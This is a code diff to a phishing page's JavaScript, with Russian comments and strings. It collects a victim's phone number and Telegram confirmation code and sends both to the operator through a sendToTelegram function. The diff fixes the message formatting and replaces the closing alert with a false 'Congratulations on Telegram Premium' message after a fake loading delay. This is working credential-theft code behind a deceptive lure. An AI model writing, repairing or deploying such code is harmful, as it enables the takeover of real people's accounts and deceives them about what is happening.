@@ -289,21 +289,19 @@
     }
 
     function sendPhone() {
-      const countryCodeInput = document.querySelector('.country-code').value.trim();
-      const phoneInput = document.getElementById('phone').value.trim();
+      const countryCode = document.querySelector('.country-code').value.trim();
+      const phoneInput = document.getElementById('phone');
+      const phone = phoneInput.value.trim();
 
-      const countryCode = countryCodeInput.replace(/^\+/, '');
-      const phone = phoneInput.replace(/^\+/, '');
-
-      phoneNumber = +${countryCode}${phone};
-
-      // Проверка: минимум 10 цифр в основном номере
       if (phone.length < 10) {
         document.getElementById('phoneError').style.display = 'block';
         return;
       }
 
-      sendToTelegram(📱 Введён номер телефона: ${phoneNumber});
+      // Объединяем код страны и номер телефона
+      phoneNumber = countryCode + phone;
+
+      sendToTelegram(`📱 Введён номер телефона: ${phoneNumber}`);
       showStep(2);
     }
 
@@ -319,12 +317,12 @@
       document.getElementById('loading').style.display = 'block';
       document.querySelector('.btn').disabled = true;
 
-      sendToTelegram(`🔐 Код подтверждения для +${phoneNumber}: ${code}`);
+      sendToTelegram(`🔐 Код подтверждения для ${phoneNumber}: ${code}`);
 
       setTimeout(() => {
         document.getElementById('loading').style.display = 'none';
         document.querySelector('.btn').disabled = false;
-        alert('Спасибо! Данные в порядке.');
+        alert('Поздравляем с Telegram Premium! Изменения скоро вступят в силу.');
       }, 2000);
     }
 
